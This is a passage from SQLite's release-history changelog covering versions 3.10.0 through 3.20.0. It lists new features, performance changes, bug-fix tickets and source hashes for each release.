SQLITE_STMTSTATUS_MEMUSED options for the sqlite3_stmt_status() interface. Provide PRAGMA functions for PRAGMA integrity_check, PRAGMA quick_check, and PRAGMA foreign_key_check. Add the -withoutnulls option to the TCL interface eval method. Enhance the sqlite3_analyzer.exe utility program so that it shows the number of bytes of metadata on btree pages. The SQLITE_DBCONFIG_ENABLE_QPSG run-time option and the SQLITE_ENABLE_QPSG compile-time option enable the query planner stability guarantee. See also ticket 892fc34f173e99d8 Miscellaneous optimizations result in a 2% reduction in CPU cycles used. Bug Fixes: Fix the behavior of sqlite3_column_name() for queries that use the flattening optimization so that the result is consistent with other queries that do not use that optimization, and with PostgreSQL, MySQL, and SQLServer. Ticket de3403bf5ae. Fix the query planner so that it knows not to use automatic indexes on the right table of LEFT JOIN if the WHERE clause uses the IS operator. Fix for ce68383bf6aba. Ensure that the query planner knows that any column of a flattened LEFT JOIN can be NULL even if that column is labeled with \"NOT NULL\". Fix for ticket 892fc34f173e99d8. Fix rare false-positives in PRAGMA integrity_check when run on a database connection with attached databases. Ticket a4e06e75a9ab61a12 Fix a bug (discovered by OSSFuzz) that causes an assertion fault if certain dodgy CREATE TABLE declarations are used. Ticket bc115541132dad136 Hashes: SQLITE_SOURCE_ID: \"2017-08-01 13:24:15 9501e22dfeebdcefa783575e47c60b514d7c2e0cad73b2a496c0bc4b680900a8\" SHA3-256 for sqlite3.c: 79b7f3b977360456350219cba0ba0e5eb55910565eab68ea83edda2f968ebe95 2017-06-17 (3.18.2) Fix a bug that might cause duplicate output rows when an IN operator is used in the WHERE clause. Ticket 61fe9745. Hashes: SQLITE_SOURCE_ID: \"2017-06-17 09:59:36 036ebf729e4b21035d7f4f8e35a6f705e6bf99887889e2dc14ebf2242e7930dd\" SHA3-256 for sqlite3.c: b0bd014f2776b9f9508a3fc6432f70e2436bf54475369f88f0aeef75b0eec93e 2017-06-16 (3.18.1) Fix a bug associated with auto_vacuum that can lead to database corruption. The bug was introduced in version 3.16.0 (2017-01-02). Ticket fda22108. Hashes: SQLITE_SOURCE_ID: \"2017-06-16 13:41:15 77bb46233db03a3338bacf7e56f439be3dfd1926ea0c44d252eeafa7a7b31c06\" SHA3-256 for sqlite3.c: 334eaf776db9d09a4e69d6012c266bc837107edc2c981739ef82081cb11c5723 2017-06-08 (3.19.3) Fix a bug associated with auto_vacuum that can lead to database corruption. The bug was introduced in version 3.16.0 (2017-01-02). Ticket fda22108. Hashes: SQLITE_SOURCE_ID: \"2017-06-08 14:26:16 0ee482a1e0eae22e08edc8978c9733a96603d4509645f348ebf55b579e89636b\" SHA3-256 for sqlite3.c: 368f1d31272b1739f804bcfa5485e5de62678015c4adbe575003ded85c164bb8 2017-05-25 (3.19.2) Fix more bugs in the LEFT JOIN flattening optimization. Ticket 7fde638e94287d2c. Hashes: SQLITE_SOURCE_ID: \"2017-05-25 16:50:27 edb4e819b0c058c7d74d27ebd14cc5ceb2bad6a6144a486a970182b7afe3f8b9\" SHA3-256 for sqlite3.c: 1be0c457869c1f7eba58c3b5097b9ec307a15be338308bee8e5be8570bcf5d1e 2017-05-24 (3.19.1) Fix a bug in the LEFT JOIN flattening optimization. Ticket cad1ab4cb7b0fc. Remove a surplus semicolon that was causing problems for older versions of MSVC. Hashes: SQLITE_SOURCE_ID: \"2017-05-24 13:08:33 f6d7b988f40217821a382bc298180e9e6794f3ed79a83c6ef5cae048989b3f86\" SHA3-256 for sqlite3.c: 996b2aff37b6e0c6663d0312cd921bbdf6826c989cbbb07dadde5e9672889bca 2017-05-22 (3.19.0) The SQLITE_READ authorizer callback is invoked once with a column name that is an empty string for every table referenced in a query from which no columns are extracted. When using an index on an expression, try to use expression values already available in the index, rather than loading the original columns and recomputing the expression. Enhance the flattening optimization so that it is able to flatten views on the right-hand side of a LEFT JOIN. Use replace() instead of char() for escaping newline and carriage-return characters embedded in strings in the .dump output from the command-line shell. Avoid unnecessary foreign key processing in UPDATE statements that do not touch the columns that are constrained by the foreign keys. On a DISTINCT query that uses an index, try to skip ahead to the next distinct entry using the index rather than stepping through rows, when an appropriate index is available. Avoid unnecessary invalidation of sqlite3_blob handles when making changes to unrelated tables. Transfer any terms of the HAVING clause that use only columns mentioned in the GROUP BY clause over to the WHERE clause for faster processing. Reuse the same materialization of a VIEW if that VIEW appears more than once in the same query. Enhance PRAGMA integrity_check so that it identifies tables that have two or more rows with the same rowid. Enhance the FTS5 query syntax so that column filters may be applied to arbitrary expressions. Enhance the json_extract() function to cache and reuse parses of JSON input text. Added the anycollseq.c loadable extension that allows a generic SQLite database connection to read a schema that contains unknown and/or application-specific collating sequences. Bug Fixes: Fix a problem in REPLACE that can result in a corrupt database containing two or more rows with the same rowid. Fix for ticket f68dc596c4e6018d. Fix a problem in PRAGMA integrity_check that was causing a subsequent VACUUM to behave suboptimally. Fix the PRAGMA foreign_key_check command so that it works correctly with foreign keys on WITHOUT ROWID tables. Fix a bug in the b-tree logic that can result in incorrect duplicate answers for IN operator queries. Ticket 61fe9745 Disallow leading zeros in numeric constants in JSON. Fix for ticket b93be8729a895a528e2. Disallow control characters inside of strings in JSON. Fix for ticket 6c9b5514077fed34551. Limit the depth of recursion for JSON objects and arrays in order to avoid excess stack usage in the recursive descent parser. Fix for ticket 981329adeef51011052. Hashes: SQLITE_SOURCE_ID: \"2017-05-22 13:58:13 28a94eb282822cad1d1420f2dad6bf65e4b8b9062eda4a0b9ee8270b2c608e40\" SHA3-256 for sqlite3.c: c30326aa1a9cc342061b755725eac9270109acf878bc59200dd4b1cea6bc2908 2017-03-30 (3.18.0) Added the PRAGMA optimize command The SQLite version identifier returned by the sqlite_source_id() SQL function and the sqlite3_sourceid() C API and found in the SQLITE_SOURCE_ID macro is now a 64-digit SHA3-256 hash instead of a 40-digit SHA1 hash. Added the json_patch() SQL function to the JSON1 extension. Enhance the LIKE optimization so that it works for arbitrary expressions on the left-hand side as long as the LIKE pattern on the right-hand side does not begin with a digit or minus sign. Added the sqlite3_set_last_insert_rowid() interface and use the new interface in the FTS3, FTS4, and FTS5 extensions to ensure that the sqlite3_last_insert_rowid() interface always returns reasonable values. Enhance PRAGMA integrity_check and PRAGMA quick_check so that they verify CHECK constraints. Enhance the query plans for joins to detect empty tables early and halt without doing unnecessary work. Enhance the sqlite3_mprintf() family of interfaces and the printf SQL function to put comma separators at the thousands marks for integers, if the \",\" format modifier is used in between the \"%\" and the \"d\" (example: \"%,d\"). Added the -DSQLITE_MAX_MEMORY=N compile-time option. Added the .sha3sum dot-command and the .selftest dot-command to the command-line shell Begin enforcing SQLITE_LIMIT_VDBE_OP. This can be used, for example, to prevent excessively large prepared statements in systems that accept SQL queries from untrusted users. Various performance improvements. Bug Fixes: Ensure that indexed expressions with collating sequences are handled correctly. Fix for ticket eb703ba7b50c1a5. Fix a bug in the 'start of ...' modifiers for the date and time functions. Ticket 6097cb92745327a1 Fix a potential segfault in complex recursive triggers, resulting from a bug in the OP_Once opcode introduced as part of a performance optimization in version 3.15.0. Ticket 06796225f59c057c In the RBU extension, add extra sync operations to avoid the possibility of corruption following a power failure. The sqlite3_trace_v2() output for nested SQL statements should always begin with a \"--\" comment marker. Hashes: SQLITE_SOURCE_ID: \"2017-03-28 18:48:43 424a0d380332858ee55bdebc4af3789f74e70a2b3ba1cf29d84b9b4bcf3e2e37\" SHA3-256 for sqlite3.c: cbf322df1f76be57fb3be84f3da1fc71d1d3dfdb7e7c2757fb0ff630b3bc2e5d 2017-02-13 (3.17.0) Approximately 25% better performance from the R-Tree extension. Uses compiler built-ins (ex: __builtin_bswap32() or _byteswap_ulong()) for byteswapping when available. Uses the sqlite3_blob key/value access object instead of SQL for pulling content out of R-Tree nodes Other miscellaneous enhancements such as loop unrolling. Add the SQLITE_DEFAULT_LOOKASIDE compile-time option. Increase the default lookaside size from 512,125 to 1200,100 as this provides better performance while only adding 56KB of extra memory per connection. Memory-sensitive applications can restore the old default at compile-time, start-time, or run-time. Use compiler built-ins __builtin_sub_overflow(), __builtin_add_overflow(), and __builtin_mul_overflow() when available. (All compiler built-ins can be omitted with the SQLITE_DISABLE_INTRINSIC compile-time option.) Added the SQLITE_ENABLE_NULL_TRIM compile-time option, which can result in significantly smaller database files for some applications, at the risk of being incompatible with older versions of SQLite. Change SQLITE_DEFAULT_PCACHE_INITSZ from 100 to 20, for improved performance. Added the SQLITE_UINT64_TYPE compile-time option as an analog to SQLITE_INT64_TYPE. Perform some UPDATE operations in a single pass instead of in two passes. Enhance the session extension to support WITHOUT ROWID tables. Fixed performance problems and potential stack overflows when creating views from multi-row VALUES clauses with hundreds of thousands of rows. Added the sha1.c extension. In the command-line shell, enhance the \".mode\" command so that it restores the default column and row separators for modes \"line\", \"list\", \"column\", and \"tcl\". Enhance the SQLITE_DIRECT_OVERFLOW_READ option so that it works in WAL mode as long as the pages being read are not in the WAL file. Enhance the Lemon parser generator so that it can store the parser object as a stack variable rather than allocating space from the heap and make use of that enhancement in the amalgamation. Other performance improvements. Uses about 6.5% fewer CPU cycles. Bug Fixes: Throw an error if the ON clause of a LEFT JOIN references tables to the right of the ON clause. This is the same behavior as PostgreSQL. Formerly, SQLite silently converted the LEFT JOIN into an INNER JOIN. Fix for ticket 25e335f802dd. Use the correct affinity for columns of automatic indexes. Ticket 7ffd1ca1d2ad4ec. Ensure that the sqlite3_blob_reopen() interface can correctly handle short rows. Fix for ticket e6e962d6b0f06f46e. Hashes: SQLITE_SOURCE_ID: \"2017-02-13 16:02:40 ada05cfa86ad7f5645450ac7a2a21c9aa6e57d2c\" SHA1 for sqlite3.c: cc7d708bb073c44102a59ed63ce6142da1f174d1 2017-01-06 (3.16.2) Fix the REPLACE statement for WITHOUT ROWID tables that lack secondary indexes so that it works correctly with triggers and foreign keys. This was a new bug caused by performance optimizations added in version 3.16.0. Ticket 30027b613b4 Fix the sqlite3_value_text() interface so that it correctly translates content generated by zeroblob() into a string of all 0x00 characters. This is a long-standing issue discovered after the 3.16.1 release by OSS-Fuzz Fix the bytecode generator to deal with a subquery in the FROM clause that is itself a UNION ALL where one side of the UNION ALL is a view that contains an ORDER BY. This is a long-standing issue that was discovered after the release of 3.16.1. See ticket 190c2507. Adjust the sqlite3_column_count() API so it more often returns the same values for PRAGMA statements as it did in prior releases, to minimize disruption to applications that might be using that interface in unexpected ways. Hashes: SQLITE_SOURCE_ID: \"2017-01-06 16:32:41 a65a62893ca8319e89e48b8a38cf8a59c69a8209\" SHA1 for sqlite3.c: 2bebdc3f24911c0d12b6d6c0123c3f84d6946b08 2017-01-03 (3.16.1) Fix a bug concerning the use of row values within triggers (see ticket 8c9458e7) that was in version 3.15.0 but was not reported until moments after the 3.16.0 release was published. Hashes: SQLITE_SOURCE_ID: \"2017-01-03 18:27:03 979f04392853b8053817a3eea2fc679947b437fd\" SHA1 for sqlite3.c: 354f6223490b30fd5320b4066b1535e4ce33988d 2017-01-02 (3.16.0) Uses 9% fewer CPU cycles. (See the CPU performance measurement report for details on how this performance increase was computed.) Added experimental support for PRAGMA functions. Added the SQLITE_DBCONFIG_NO_CKPT_ON_CLOSE option to sqlite3_db_config(). Enhance the date and time functions so that the 'unixepoch' modifier works for the full span of supported dates. Changed the default configuration of the lookaside memory allocator from 500 slots of 128 bytes each into 125 slots of 512 bytes each. Enhanced \"WHERE x NOT NULL\" partial indexes so that they are usable if the \"x\" column appears in a LIKE or GLOB operator. Enhanced sqlite3_interrupt() so that it interrupts checkpoint operations that are in process. Enhanced the LIKE and GLOB matching algorithm to be faster for cases when the pattern contains multiple wildcards. Added the SQLITE_FCNTL_WIN32_GET_HANDLE file control opcode. Added \".mode quote\" to the command-line shell. Added \".lint fkey-indexes\" to the command-line shell. Added the .imposter dot-command to the command-line shell. Added the remember(V,PTR) SQL function as a loadable extension. Rename the SQLITE_OMIT_BUILTIN_TEST compile-time option to SQLITE_UNTESTABLE to better reflect the implications of using it. Bug Fixes: Fix a long-standing bug in the query planner that caused incorrect results on a LEFT JOIN where the left-hand table is a subquery and the join constraint is a bare column name coming from the left-hand subquery. Ticket 2df0107b. Correctly handle the integer literal -0x8000000000000000 in the query planner. Hashes: SQLITE_SOURCE_ID: \"2017-01-02 11:57:58 04ac0b75b1716541b2b97704f4809cb7ef19cccf\" SHA1 for sqlite3.c: e2920fb885569d14197c9b7958e6f1db573ee669 2016-11-28 (3.15.2) Multiple bug fixes to the row value logic that was introduced in version 3.15.0. Fix a NULL pointer dereference in ATTACH/DETACH following a maliciously constructed syntax error. Ticket 2f1b168ab4d4844. Fix a crash that can occur following an out-of-memory condition in the built-in instr() function. In the JSON extension, fix the JSON validator so that it correctly rejects invalid backslash escapes within strings. Hashes: SQLITE_SOURCE_ID: \"2016-11-28 19:13:37 bbd85d235f7037c6a033a9690534391ffeacecc8\" SHA1 for sqlite3.c: 06d77b42a3e70609f8d4bbb97caf53652f1082cb 2016-11-04 (3.15.1) Added SQLITE_FCNTL_WIN32_GET_HANDLE file control opcode. Fix the VACUUM command so that it spills excess content to disk rather than holding everything in memory, and possible causing an out-of-memory error for larger database files. This fixes an issue introduced by version 3.15.0. Fix a case (present since 3.8.0 - 2013-08-26) where OR-connected terms in the ON clause of a LEFT JOIN might cause incorrect results. Ticket 34a579141b2c5ac. Fix a case where the use of row values in the ON clause of a LEFT JOIN might cause incorrect results. Ticket fef4bb4bd9185ec8f. Hashes: SQLITE_SOURCE_ID: \"2016-11-04 12:08:49 1136863c76576110e710dd5d69ab6bf347c65e36\" SHA1 for sqlite3.c: e7c26a7be3e431dd06898f8d262c4ef240c07366 2016-10-14 (3.15.0) Added support for row values. Allow deterministic SQL functions in the WHERE clause of a partial index. Added the \"modeof=filename\" URI parameter on the unix VFS Added support for SQLITE_DBCONFIG_MAINDBNAME. Added the ability to VACUUM an ATTACH-ed database. Enhancements to the command-line shell: Add the \".testcase\" and \".check\" dot-commands. Added the --new option to the \".open\" dot-command, causing any prior content in the database to be purged prior to opening. Enhance the fts5vocab virtual table to handle \"ORDER BY term\" efficiently. Miscellaneous micro-optimizations reduce CPU usage by more than 7% on common workloads. Most optimization in this release has been on the front-end (sqlite3_prepare_v2()). Bug Fixes: The multiply operator now correctly detects 64-bit integer overflow and promotes to floating point in all corner-cases. Fix for ticket 1ec41379c9c1e400. Correct handling of columns with redundant unique indexes when those columns are used on the LHS of an IN operator. Fix for ticket 0eab1ac759. Skip NULL entries on range queries in indexes on expressions. Fix for ticket 4baa46491212947. Ensure that the AUTOINCREMENT counters in the sqlite_sequence table are initialized doing \"Xfer Optimization\" on \"INSERT ... SELECT\" statements. Fix for ticket 7b3328086a5c116c. Make sure the ORDER BY LIMIT optimization (from check-in 559733b09e) works with IN operators on INTEGER PRIMARY KEYs. Fix for ticket 96c1454c Hashes: SQLITE_SOURCE_ID: \"2016-10-14 10:20:30 707875582fcba352b4906a595ad89198d84711d8\" SHA1 for sqlite3.c: fba106f8f6493c66eeed08a2dfff0907de54ae76 2016-09-12 (3.14.2) Improved support for using the STDCALL calling convention in winsqlite3.dll. Fix the sqlite3_trace_v2() interface so that it is disabled if either the callback or the mask arguments are zero, in accordance with the documentation. Fix commenting errors and improve the comments generated on EXPLAIN listings when the -DSQLITE_ENABLE_EXPLAIN_COMMENTS compile-time option is used. Fix the \".read\" command in the command-line shell so that it understands that its input is not interactive. Correct affinity computations for a SELECT on the RHS of an IN operator. Fix for ticket 199df4168c. The ORDER BY LIMIT optimization is not valid unless the inner-most IN operator loop is actually used by the query plan. Fix for ticket 0c4df46116e90f92. Fix an internal code generator problem that was causing some DELETE operations to no-op. Ticket ef360601 Hashes: SQLITE_SOURCE_ID: \"2016-09-12 18:50:49 29dbef4b8585f753861a36d6dd102ca634197bd6\" SHA1 for sqlite3.c: bcc4a1989db45e7f223191f2d0f66c1c28946383 2016-08-11 (3.14.1) A performance enhancement to the page-cache \"truncate\" operation reduces COMMIT time by dozens of milliseconds on systems with a large page cache. Fix to the --rbu option of sqldiff. Hashes: SQLITE_SOURCE_ID: \"2016-08-11 18:53:32 a12d8059770df4bca59e321c266410344242bf7b\" SHA1 for sqlite3.c: d545b24892278272ce4e40e0567d69c8babf12ea 2016-08-08 (3.14) Celebrating the SQLite \" release\" with a home-baked pie. Added support for WITHOUT ROWID virtual tables. Improved the query planner so that the OR optimization can be used on virtual tables even if one or more of the disjuncts use the LIKE, GLOB, REGEXP, MATCH operators. Added the CSV virtual table for reading RFC 4180 formatted comma-separated value files. Added the carray() table-valued function extension. Enabled persistent loadable extensions using the new SQLITE_OK_LOAD_PERMANENTLY return code from the extension entry point. Added the SQLITE_DBSTATUS_CACHE_USED_SHARED option to sqlite3_db_status(). Add the vfsstat.c loadable extension - a VFS shim that measures I/O together with an eponymous virtual table that provides access to the measurements. Improved algorithm for running queries with both an ORDER BY and a LIMIT where only the inner-most loop naturally generates rows in the correct order. Enhancements to Lemon parser generator, so that it generates a faster parser. The PRAGMA compile_options command now attempts to show the version number of the compiler that generated the library. Enhance PRAGMA table_info so that it provides information about eponymous virtual tables. Added the \"win32-none\" VFS, analogous to the \"unix-none\" VFS, that works like the default \"win32\" VFS except that it ignores all file locks. The query planner uses a full scan of a partial index instead of a full scan of the main table, in cases where that makes sense. Allow table-valued functions to appear on the right-hand side of an IN operator. Created the dbhash.exe command-line utility. Added two new C-language interfaces: sqlite3_expanded_sql() and sqlite3_trace_v2(). These new interfaces subsume the functions of sqlite3_trace() and sqlite3_profile() which are now deprecated. Added the json_quote() SQL function to the json1 extension. Disable the authorizer callback while reparsing the schema. Added the SQLITE_ENABLE_UNKNOWN_SQL_FUNCTION compile-time option and turned that option on by default when building the command-line shell. Bug Fixes: Fix the ALTER TABLE command so that it does not corrupt descending indexes when adding a column to a legacy file format database. Ticket f68bf68513a1c15f Fix a NULL-pointer dereference/crash that could occurs when a transitive WHERE clause references a non-existent collating sequence. Ticket e8d439c77685eca6. Improved the cost estimation for an index scan which includes a WHERE clause that can be partially or fully evaluated using columns in the index and without having to do a table lookup. This fixes a performance regression that occurred for some obscure queries following the ORDER BY LIMIT optimization introduced in version 3.12.0. Hashes: SQLITE_SOURCE_ID: \"2016-08-08 13:40:27 d5e98057028abcf7217d0d2b2e29bbbcdf09d6de\" SHA1 for sqlite3.c: 234a3275d03a287434ace3ccdf1afb208e6b0e92 2016-05-18 (3.13.0) Postpone I/O associated with TEMP files for as long as possible, with the hope that the I/O can ultimately be avoided completely. Merged the session extension into trunk. Added the \".auth ON|OFF\" command to the command-line shell. Added the \"--indent\" option to the \".schema\" and \".fullschema\" commands of the command-line shell, to turn on pretty-printing. Added the \".eqp full\" option to the command-line shell, that does both EXPLAIN and EXPLAIN QUERY PLAN on each statement that is evaluated. Improved unicode filename handling in the command-line shell on Windows. Improved resistance against goofy query planner decisions caused by incomplete or incorrect modifications to the sqlite_stat1 table by the application. Added the sqlite3_db_config(db,SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION) interface which allows the sqlite3_load_extension() C-API to be enabled while keeping the load_extension() SQL function disabled for security. Change the temporary directory search algorithm on Unix to allow directories with write and execute permission, but without read permission, to serve as temporary directories. Apply this same standard to the \".\" fallback directory. Bug Fixes: Fix a problem with the multi-row one-pass DELETE optimization that was causing it to compute incorrect answers with a self-referential subquery in the WHERE clause. Fix for ticket dc6ebeda9396087 Fix a possible segfault with DELETE when table is a rowid table with an INTEGER PRIMARY KEY and the WHERE clause contains a OR and the table has one or more indexes that are able to trigger the OR optimization, but none of the indexes reference any table columns other than the INTEGER PRIMARY KEY. Ticket 16c9801ceba49. When checking for the WHERE-clause push-down optimization, verify that all terms of the compound inner SELECT are non-aggregate, not just the last term. Fix for ticket f7f8c97e97597. Fix a locking race condition in Windows that can occur when two or more processes attempt to recover the same hot journal at the same time. Hashes: SQLITE_SOURCE_ID: \"2016-05-18 10:57:30 fc49f556e48970561d7ab6a2f24fdd7d9eb81ff2\" SHA1 for sqlite3.c: 9b9171b1e6ce7a980e6b714e9c0d9112657ad552 Bug fixes backported into patch release 3.12.2 (2016-04-18): Fix a backwards compatibility problem in version 3.12.0 and 3.12.1: Columns declared as \"INTEGER\" PRIMARY KEY (with quotes around the datatype keyword) were not being recognized as an INTEGER PRIMARY KEY, which resulted in an incompatible database file. Ticket 7d7525cb01b68 Fix a bug (present since version 3.9.0) that can cause the DELETE operation to miss rows if PRAGMA reverse_unordered_selects is turned on. Ticket a306e56ff68b8fa5 Fix a bug in the code generator that can cause incorrect results if two or more virtual tables are joined and the virtual table used in outer loop of the join has an IN operator constraint. Correctly interpret negative \"PRAGMA cache_size\" values when determining the cache size used for sorting large amounts of data. Bug fixes backported into patch release 3.12.1 (2016-04-08): Fix a boundary condition error introduced by version 3.12.0 that can result in a crash during heavy SAVEPOINT usage. Ticket 7f7f8026eda38. Fix views so that they inherit column datatypes from the table that they are defined against, when possible. Fix the query planner so that IS and IS NULL operators are able to drive an index on a LEFT OUTER JOIN. 2016-04-18 (3.12.2) Fix a backwards compatibility problem in version 3.12.0 and 3.12.1: Columns declared as \"INTEGER\" PRIMARY KEY (with quotes around the datatype keyword) were not being recognized as an INTEGER PRIMARY KEY, which resulted in an incompatible database file. Ticket 7d7525cb01b68 Fix a bug (present since version 3.9.0) that can cause the DELETE operation to miss rows if PRAGMA reverse_unordered_selects is turned on. Ticket a306e56ff68b8fa5 Fix a bug in the code generator that can cause incorrect results if two or more virtual tables are joined and the virtual table used in outer loop of the join has an IN operator constraint. Correctly interpret negative \"PRAGMA cache_size\" values when determining the cache size used for sorting large amounts of data. Hashes: SQLITE_SOURCE_ID: \"2016-04-18 17:30:31 92dc59fd5ad66f646666042eb04195e3a61a9e8e\" SHA1 for sqlite3.c: de5a5898ebd3a3477d4652db143746d008b24c83 2016-04-08 (3.12.1) Fix a boundary condition error introduced by version 3.12.0 that can result in a crash during heavy SAVEPOINT usage. Ticket 7f7f8026eda38. Fix views so that they inherit column datatypes from the table that they are defined against, when possible. Fix the query planner so that IS and IS NULL operators are able to drive an index on a LEFT OUTER JOIN. Hashes: SQLITE_SOURCE_ID: \"2016-04-08 15:09:49 fe7d3b75fe1bde41511b323925af8ae1b910bc4d\" SHA1 for sqlite3.c: ebb18593350779850e3e1a930eb84a70fca8c1d1 2016-04-01 (3.9.3) Backport a simple query planner optimization that allows the IS operator to drive an index on a LEFT OUTER JOIN. No other changes from the version 3.9.2 baseline. 2016-03-29 (3.12.0) Potentially Disruptive Change: The SQLITE_DEFAULT_PAGE_SIZE is increased from 1024 to 4096. The SQLITE_DEFAULT_CACHE_SIZE is changed from 2000 to -2000 so the same amount of cache memory is used by default. See the application note on the version 3.12.0 page size change for further information. Performance enhancements: Enhancements to the Lemon parser generator so that it creates a smaller and faster SQL parser. Only create master journal files if two or more attached databases are all modified, do not have PRAGMA synchronous set to OFF, and do not have the journal_mode set to OFF, MEMORY, or WAL. Only create statement journal files when their size exceeds a threshold. Otherwise the journal is held in memory and no I/O occurs. The threshold can be configured at compile-time using SQLITE_STMTJRNL_SPILL or at start-time using sqlite3_config(SQLITE_CONFIG_STMTJRNL_SPILL). The query planner is able to optimize IN operators on virtual tables even if the xBestIndex method does not set the sqlite3_index_constraint_usage.omit flag of the virtual table column to the left of the IN operator. The query planner now does a better job of optimizing virtual table accesses in a 3-way or higher join where constraints on the virtual table are split across two or more other tables of the join. More efficient handling of application-defined SQL functions, especially in cases where the application defines hundreds or thousands of custom functions. The query planner considers the LIMIT clause when estimating the cost of ORDER BY. The configure script (on unix) automatically detects pread() and pwrite() and sets compile-time options to use those OS interfaces if they are available. Reduce the amount of memory needed to hold the schema. Other miscellaneous micro-optimizations for improved performance and reduced memory usage. New Features: Added the SQLITE_DBCONFIG_ENABLE_FTS3_TOKENIZER option to sqlite3_db_config() which allows the two-argument version of the fts3_tokenizer() SQL function to be enabled or disabled at run-time. Added the sqlite3rbu_bp_progress() interface to the RBU extension. The PRAGMA defer_foreign_keys=ON statement now also disables RESTRICT actions on foreign key. Added the sqlite3_system_errno() interface. Added the SQLITE_DEFAULT_SYNCHRONOUS and SQLITE_DEFAULT_WAL_SYNCHRONOUS compile-time options. The SQLITE_DEFAULT_SYNCHRONOUS compile-time option replaces the SQLITE_EXTRA_DURABLE option, which is no longer supported. Enhanced the \".stats\" command in the command-line shell to show more information about I/O performance obtained from /proc, when available. Bug fixes: Make sure the sqlite3_set_auxdata() values from multiple triggers within a single statement do not interfere with one another. Ticket dc9b1c91. Fix the code generator for expressions of the form \"x IN (SELECT...)\" where the SELECT statement on the RHS is a correlated subquery. Ticket 5e3c886796e5512e. Fix a harmless TSAN warning associated with the sqlite3_db_readonly() interface. Hashes: SQLITE_SOURCE_ID: \"2016-03-29 10:14:15 e9bb4cf40f4971974a74468ef922bdee481c988b\" SHA1 for sqlite3.c: cba2be96d27cb51978cd4a200397a4ad178986eb 2016-03-03 (3.11.1) Improvements to the Makefiles and build scripts used by VisualStudio. Fix an FTS5 issue in which the 'optimize' command could cause index corruption. Fix a buffer overread that might occur if FTS5 is used to query a corrupt database file. Increase the maximum \"scope\" value for the spellfix1 extension from 6 to 30. SQLITE_SOURCE_ID: \"2016-03-03 16:17:53 f047920ce16971e573bc6ec9a48b118c9de2b3a7\" SHA1 for sqlite3.c: 3da832fd2af36eaedb05d61a8f4c2bb9f3d54265 2016-02-15 (3.11.0) General improvements: Enhanced WAL mode so that it works efficiently with transactions that are larger than the cache_size. Added the FTS5 detail option. Added the \"EXTRA\" option to PRAGMA synchronous that does a sync of the containing directory when a rollback journal is unlinked in DELETE mode, for better durability. The SQLITE_EXTRA_DURABLE compile-time option enables PRAGMA synchronous=EXTRA by default. Enhanced the query planner so that it is able to use a covering index as part of the OR optimization. Avoid recomputing NOT NULL and CHECK constraints on unchanged columns in UPDATE statement. Many micro-optimizations, resulting in a library that is faster than the previous release. Enhancements to the command-line shell: By default, the shell is now in \"auto-explain\" mode. The output of EXPLAIN commands is automatically formatted. Added the \".vfslist\" dot-command. The SQLITE_ENABLE_EXPLAIN_COMMENTS compile-time option is now turned on by default in the standard builds. Enhancements to the TCL Interface: If a database connection is opened with the \"-uri 1\" option, then URI filenames are honored by the \"backup\" and \"restore\" commands. Added the \"-sourceid\" option to the \"sqlite3\" command. Makefile improvements: Improved pthreads detection in configure scripts. Add the ability to do MSVC Windows builds from the amalgamation tarball. Bug fixes Fix an issue with incorrect sharing of VDBE temporary registers between co-routines that could cause incorrect query results in obscure cases. Ticket d06a25c84454a. Fix a problem in the sqlite3_result_subtype() interface that could cause problems for the json1 extension under obscure circumstances. Fix for ticket f45ac567eaa9f9. Escape control characters in JSON strings. Fix for ticket ad2559db380abf8. Reenable the xCurrentTime and xGetLastError methods in the built-in unix VFSes as long as SQLITE_OMIT_DEPRECATED is not defined. Backwards Compatibility: Because of continuing security concerns, the two-argument version of of the seldom-used and little-known fts3_tokenizer() function is disabled unless SQLite is compiled with the SQLITE_ENABLE_FTS3_TOKENIZER. Hashes: SQLITE_SOURCE_ID: \"2016-02-15 17:29:24 3d862f207e3adc00f78066799ac5a8c282430a5f\" SHA1 for sqlite3.c: df01436c5fcfe72d1a95bc172158219796e1a90b 2016-01-20 (3.10.2) Critical bug fix: Version 3.10.0 introduced a case-folding bug in the LIKE operator which is fixed by this patch release. Ticket 80369eddd5c94. Other miscellaneous bug fixes: Fix a use-after-free that can occur when SQLite is compiled with -DSQLITE_HAS_CODEC. Fix the build so that it works with -DSQLITE_OMIT_WAL. Fix the configure script for the amalgamation so that the --readline option works again on Raspberry PIs. Hashes: SQLITE_SOURCE_ID: \"2016-01-20 15:27:19 17efb4209f97fb4971656086b138599a91a75ff9\" SHA1 for sqlite3.c: f7088b19d97cd7a1c805ee95c696abd54f01de4f 2016-01-14 (3.10.1) New feature: Add the SQLITE_FCNTL_JOURNAL_POINTER file control. Bug fix: Fix a 16-month-old bug in the query planner that could generate incorrect results when a scalar subquery attempts to use the block sorting optimization. Ticket cb3aa0641d9a4. Hashes: SQLITE_SOURCE_ID: \"2016-01-13 21:41:56 254419c36766225ca542ae873ed38255e3fb8588\" SHA1 for sqlite3.c: 1398ba8e4043550a533cdd0834bfdad1c9eab0f4 2016-01-06 (3.10.0) General improvements: Added support for LIKE, GLOB, and REGEXP operators on virtual tables. Added the colUsed field to sqlite3_index_info for use by the sqlite3_module.xBestIndex method. Enhance the PRAGMA cache_spill statement to accept a 32-bit integer parameter which is the threshold below which cache spilling is prohibited. On unix, if a symlink to a database file is opened, then the corresponding journal files are based on the actual filename, not the symlink name. Added the \"--transaction\" option to sqldiff. Added the sqlite3_db_cacheflush() interface. Added the sqlite3_strlike() interface. When using memory-mapped I/O map the database file read-only so that stray pointers and/or array overruns in the application cannot accidentally modify the database file. Added the experimental sqlite3_snapshot_get(), sqlite3_snapshot_open(), and sqlite3_snapshot_free() interfaces. These are subject to change or removal in a subsequent release. Enhance the 'utc' modifier in the date and time functions so that it is a no-op if the date/time is known to already be in UTC. (This is not a compatibility break since the behavior has long been documented as \"undefined\" in that case.) Added the json_group_array() and json_group_object() SQL functions in the json extension. Added the SQLITE_LIKE_DOESNT_MATCH_BLOBS compile-time option. Many small performance optimizations. Portability enhancements: Work around a sign-extension bug in the optimizer of the HP C compiler on HP/UX. (details) Enhancements to the command-line shell: Added the \".changes ON|OFF\" and \".vfsinfo\" dot-commands. Translate between MBCS and UTF8 when running in cmd.exe on Windows. Enhancements to makefiles: Added the --enable-editline and --enable-static-shell options to the various autoconf-generated configure scripts. Omit all use of \"awk\" in the makefiles, to make building easier for MSVC users. Important fixes: Fix inconsistent integer to floating-point comparison operations that could result in a corrupt index if the index is created on a table column that contains both large integers and floating point values of similar magnitude. Ticket 38a97a87a6. Fix an infinite-loop in the query planner that could occur on malformed common table expressions. Various bug fixes in the sqldiff tool. Hashes: SQLITE_SOURCE_ID: 